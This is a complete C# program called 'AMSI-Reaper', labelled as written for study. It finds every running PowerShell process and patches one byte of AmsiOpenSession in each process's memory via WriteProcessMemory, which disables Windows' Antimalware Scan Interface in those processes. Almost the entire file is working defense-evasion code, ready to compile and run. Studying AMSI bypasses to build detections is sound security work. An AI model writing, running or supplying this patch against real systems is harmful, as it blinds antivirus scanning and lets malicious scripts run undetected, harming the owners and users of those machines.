/*
# --------------------------- #
#    About the AMSI-Reaper    #
# --------------------------- #
#    Developed by: H0ru       #
#    Developed for studies!   #
# --------------------------- #
*/

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class AMSIReaper
{
    public const int PROCESS_VM_OPERATION = 0x0008;
    public const int PROCESS_VM_READ = 0x0010;
    public const int PROCESS_VM_WRITE = 0x0020;

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
}

class Program
{
    static void Main()
    {
        Console.WriteLine("[>] AMSI-Reaper written in C#, by H0ru");
        PatchAllPowershells();
    }

    static void ModAMSI(uint processId)
    {
        byte patch = 0xEB;

        IntPtr hHandle = AMSIReaper.OpenProcess(AMSIReaper.PROCESS_VM_OPERATION | AMSIReaper.PROCESS_VM_READ | AMSIReaper.PROCESS_VM_WRITE, false, (int)processId);
        if (hHandle != IntPtr.Zero)
        {
            Console.WriteLine("[+] Process opened with Handle ~> " + hHandle);
        }

        IntPtr amsiDLL = AMSIReaper.LoadLibrary("amsi.dll");
        if (amsiDLL != IntPtr.Zero)
        {
            Console.WriteLine("[+] amsi.dll located at ~> " + amsiDLL);
        }

        IntPtr amsiOpenSession = AMSIReaper.GetProcAddress(amsiDLL, "AmsiOpenSession");
        if (amsiOpenSession != IntPtr.Zero)
        {
            Console.WriteLine("[+] AmsiOpenSession located at ~> " + amsiOpenSession);
        }

        IntPtr patchAddr = (IntPtr)(amsiOpenSession.ToInt64() + 3);
        Console.WriteLine("[+] Trying to Inject ~> " + patchAddr);

        int bytesWritten = 0;
        bool result = AMSIReaper.WriteProcessMemory(hHandle, patchAddr, new byte[] { patch }, 1, out bytesWritten);
        if (result)
        {
            Console.WriteLine("[!] Process Memory Injected!");
        }

        AMSIReaper.CloseHandle(hHandle);
    }

    static void PatchAllPowershells()
    {
        Process[] processes = Process.GetProcesses();
        foreach (Process proc in processes)
        {
            if (proc.ProcessName == "powershell")
            {
                uint pid = (uint)proc.Id;
                Console.WriteLine("");
                Console.WriteLine("# ----------------- [STATUS] ----------------- #");
                Console.WriteLine("[!] Injection process PowerShell with PID: " + pid);
                ModAMSI(pid);
            }
        }
    }
}
